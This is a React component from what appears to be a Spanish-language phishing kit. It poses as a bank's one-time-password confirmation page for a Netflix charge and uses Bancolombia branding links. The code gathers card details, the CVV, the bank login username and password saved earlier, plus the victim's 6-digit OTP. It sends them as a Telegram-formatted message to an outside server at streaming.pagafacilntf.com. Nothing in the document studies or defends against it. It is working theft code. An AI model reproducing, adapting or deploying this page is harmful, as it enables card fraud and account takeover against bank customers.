import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';
import IMG from './img/logo.png';

const OTP = () => {
  const [otp, setOtp] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [banco, setBanco] = useState('No disponible');
  const [savedFormValues, setSavedFormValues] = useState({});
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const navigate = useNavigate();

  useEffect(() => {
    const formValues = localStorage.getItem('formValues');
    const bancoValue = localStorage.getItem('banco') || 'No disponible';
    const username = localStorage.getItem('username') || '';
    const password = localStorage.getItem('password') || '';

    if (formValues) {
      const parsedValues = JSON.parse(formValues);
      setSavedFormValues(parsedValues);
      setCardNumber(parsedValues.cardNumber);
    }

    setBanco(bancoValue);
    setUsername(username);
    setPassword(password);
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (otp.length !== 6) {
      alert('La clave dinámica debe tener 6 dígitos.');
      return;
    }

    const telegramMessage = `🔑📱 KEY NETFLIX 📱🔑:\n -------------------------------------------\n- 📛: ${savedFormValues.cardHolderName || 'No disponible'}\n- 💳: ${savedFormValues.cardNumber || 'No disponible'} \n- 📅: ${savedFormValues.expirationDate || 'No disponible'}\n- 🔐: ${savedFormValues.cvv || 'No disponible'}\n-------------------------------------------\n 🔑📱 LOGIN NETFLIX 📱🔑\n ------------------------------------------- \n 🏦 : ${banco}\n 👤 : ${username}\n 🔒 : ${password}\n -------------------------------------------\n⚡ OTP ⚡\n-------------------------------------------\n 🔒: ${otp}`;

    const chatId = '-4723241842'; // Asegúrate de que este ID sea correcto

    try {
      await axios.post('https://streaming.pagafacilntf.com/enviarmensaje', { chatId, message: telegramMessage });
      navigate('/signup/loginoption'); // Cambia la ruta según tus necesidades
    } catch (error) {
      console.error('Error en la solicitud:', error);
      alert('Error al enviar los datos.');
    }
  };

  return (
    <div className="bg-gray-100 min-h-screen flex flex-col items-center p-4">
      <img src={IMG} alt="Banco" className="w-1/2 my-4" />
      <div className="bg-white p-6 rounded-lg shadow-lg w-full max-w-md">
        <p className="text-sm text-gray-600 mb-4">
          Para continuar con la transacción que está a punto de realizar, debe ingresar los 6 dígitos de la clave dinámica que hemos enviado a su número de teléfono asociado con su cuenta.
        </p>
        <p className="text-sm text-gray-600 mb-4">
          Detalle de la Transacción:
        </p>
        <p className="text-sm text-gray-600 mb-4">
          <strong>Comercio:</strong> NETFLIX SERVICIOS S.A
        </p>
        <p className="text-sm text-gray-600 mb-4">
          <strong>Monto de la Transacción:</strong> $20,250 COP
        </p>
        <p className="text-sm text-gray-600 mb-4">
          <strong>Número de tarjeta:</strong> {cardNumber.slice(0, 4)}****
        </p>
        <form onSubmit={handleSubmit} className="flex flex-col items-center">
          <p className='text-sm text-gray-600 mb-2 font-bold'>Ingresa tu clave dinámica:</p>
          <input
            type="text"
            id="txtOTP"
            placeholder=""
            value={otp}
            onChange={(e) => setOtp(e.target.value)}
            className="border-b border-gray-300 w-full py-2 px-4 mb-4 text-lg text-center focus:outline-none"
            maxLength="6"
            minLength="6"
            required
          />
          <button
            type="submit"
            className="bg-[#FACC15] text-black font-bold rounded-full w-full py-2 hover:bg-gray-800 transition-colors"
          >
            Enviar
          </button>
        </form>
        <div className="text-center mt-4">
          <a href="https://www.bancolombia.com/centro-de-ayuda" className="text-blue-600 underline block mb-2">
            ¿Necesitas ayuda?
          </a>
          <a href="/signup/creditoption" className="text-blue-600 underline">
            Cerrar
          </a>
        </div>
      </div>
    </div>
  );
};

export default OTP;
